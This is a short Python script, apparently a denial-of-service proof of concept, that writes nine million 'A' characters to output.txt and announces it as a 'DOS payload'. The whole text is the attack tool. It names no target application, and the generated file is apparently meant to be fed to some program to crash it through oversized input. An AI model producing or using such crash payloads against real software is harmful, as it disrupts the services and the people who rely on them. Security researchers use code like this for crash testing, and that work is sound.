buffer = "\x41" * 9000000
try:
    f=open("output.txt","w")
    print("[!] Creating %s bytes DOS payload...." %len(buffer))
    f.write(buffer)
    f.close()
    print("[!] File Created !")
except:
    print("File cannot be created")
